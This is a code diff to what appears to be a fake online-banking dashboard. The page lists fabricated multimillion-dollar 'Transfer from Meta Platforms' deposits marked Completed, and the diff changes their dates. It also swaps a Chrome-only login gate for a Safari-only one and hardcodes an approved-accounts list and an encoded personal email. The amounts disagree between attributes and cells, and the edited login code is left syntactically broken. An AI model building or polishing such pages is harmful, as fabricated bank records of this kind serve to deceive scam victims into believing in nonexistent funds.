@@ -994,13 +994,13 @@ button:active {
               <tr><th>Date</th><th>Description</th><th>Amount</th></tr>
             </thead>
             <tbody id="transactionTableBody">
-              <tr data-date="25 Mar 2026 20:25" data-description="Transfer from Meta Platforms" data-amount="+ $34,000,000.00 USD" data-reference="TXN-9F7E-18TI-6382" data-status="Completed">
-  <td>25 Mar 2026 20:25</td>
+              <tr data-date="31 Mar 2026 01:25" data-description="Transfer from Meta Platforms" data-amount="+ $34,000,000.00 USD" data-reference="TXN-9F7E-18TI-6382" data-status="Completed">
+  <td>31 Mar 2026 01:25</td>
   <td>Transfer from Meta Platforms</td>
   <td>+ $30,000,000.00 USD</td>
 </tr>
-<tr data-date="25 Mar 2026 20:20" data-description="Transfer from Meta Platforms" data-amount="+ $20,000,000.00 USD" data-reference="TXN-9F3K-72LQ-8841" data-status="Completed">
-  <td>25 Mar 2026 20:20</td>
+<tr data-date="31 Mar 2026 01:20" data-description="Transfer from Meta Platforms" data-amount="+ $20,000,000.00 USD" data-reference="TXN-9F3K-72LQ-8841" data-status="Completed">
+  <td>31 Mar 2026 01:20</td>
   <td>Transfer from Meta Platforms</td>
   <td>+ $20,000,000.00 USD</td>
 </tr>
@@ -1163,22 +1163,33 @@ button:active {
     </div>
   </div>
 
-  <!-- Chrome Restriction Modal -->
-  <div id="chromeRestrictionModal" class="modal">
-    <div class="modal-content">
-      <h3 style="color:#b91c1c;">Browser Not Supported</h3>
-      <p>This site is optimized for Chrome/Chromium browser. Please use Chrome to access your account.</p>
-      <button onclick="closeChromeRestrictionModal()">OK</button>
-    </div>
+  <!-- Safari Restriction Modal -->
+<div id="chromeRestrictionModal" class="modal">
+  <div class="modal-content">
+    <h3 style="color:#b91c1c;">Browser Not Supported</h3>
+    <p>This site is optimized for Safari browser only. Please use Safari on iPhone, iPad, or Mac to access your account.</p>
+    <button onclick="closeChromeRestrictionModal()">OK</button>
   </div>
+</div>
 
 <script>
   const encodedUser = btoa('tanantonio228@gmail.com');
   const STORAGE_KEY = 'bankState';
   
-  // ===== CHROME DETECTION =====
-  function isChrome() {
-    return /Chrome/.test(navigator.userAgent) && !/Edg/.test(navigator.userAgent);
+  // ===== SAFARI DETECTION =====
+  function isSafari() {
+  const ua = navigator.userAgent;
+  // Strict Safari detection: must have Safari, must NOT have any other browser identifiers
+  return /Safari/.test(ua) && 
+         !/Chrome/.test(ua) && 
+         !/CriOS/.test(ua) &&      // Chrome on iOS
+         !/Edg/.test(ua) &&        // Edge (desktop)
+         !/EdgiOS/.test(ua) &&     // Edge on iOS
+         !/OPR/.test(ua) &&        // Opera
+         !/Firefox/.test(ua) &&    // Firefox (desktop)
+         !/FxiOS/.test(ua) &&      // Firefox on iOS
+         !/SamsungBrowser/.test(ua) && // Samsung Internet
+         !/UCBrowser/.test(ua);    // UC Browser
   }
   
   // ===== APPROVED ACCOUNTS LIST =====
@@ -1243,13 +1254,12 @@ button:active {
     }, duration);
   }
 
-  // UPDATED login function with Chrome restriction only
-  function login() {
-    // Chrome restriction
-    if (!isChrome()) {
-      document.getElementById('chromeRestrictionModal').classList.add('show');
-      return;
-    }
+  // UPDATED login function with safari restriction only
+  // Safari-only restriction
+if (!isSafari()) {
+  document.getElementById('chromeRestrictionModal').classList.add('show');
+  return;
+}
     
     const u = document.getElementById('user').value;
     const p = document.getElementById('pass').value;
